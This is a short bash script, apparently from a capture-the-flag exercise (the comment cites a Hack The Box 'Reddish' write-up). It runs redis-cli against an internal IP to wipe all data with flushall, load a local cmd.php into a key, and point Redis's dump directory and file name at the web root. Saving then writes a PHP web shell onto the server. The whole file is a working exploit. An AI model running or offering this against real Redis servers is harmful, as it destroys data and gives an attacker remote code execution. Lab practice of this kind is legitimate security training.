#!/bin/bash

# https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
redis-cli -h 192.168.231.93 flushall
cat cmd.php | redis-cli -h 192.168.231.93 -x set subscribetoippsecandread0xdf
redis-cli -h 192.168.231.93 config set dir /var/www/html/
redis-cli -h 192.168.231.93 config set dbfilename "cmd.php"
redis-cli -h 192.168.231.93 save
